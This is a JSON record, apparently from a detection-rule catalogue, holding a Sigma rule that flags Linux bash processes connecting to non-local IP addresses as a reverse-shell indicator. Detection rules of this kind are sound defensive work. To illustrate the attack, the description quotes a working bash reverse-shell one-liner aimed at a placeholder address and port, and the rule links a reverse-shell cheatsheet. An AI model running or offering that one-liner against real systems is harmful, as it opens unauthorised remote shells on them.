{"pageProps":{"rule":{"metadata":{"updated_date":"2021-10-16T00:00:00.000Z","creation_date":"2021-10-16T00:00:00.000Z","source_siem":"Sigma","source_siem_id":"sigma","source_url":"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml"},"rule":{"name":"Linux Reverse Shell Indicator","description":"Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')","tags":["Rule Type: Sigma","Data Source: Cross-SIEM","Tactic: Execution","Technique: T1059.004","OS: Linux","Domain: network connection","SIEM: Sigma"],"severity":"critical","risk_score":99,"type":"sigma","language":"sigma","query":"{\n  \"selection\": {\n    \"Image|endswith\": \"/bin/bash\"\n  },\n  \"filter\": {\n    \"DestinationIp\": [\n      \"127.0.0.1\",\n      \"0.0.0.0\"\n    ]\n  },\n  \"condition\": \"selection and not filter\"\n}","reference":["https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"],"false_positives":["Unknown"]}}},"__N_SSG":true}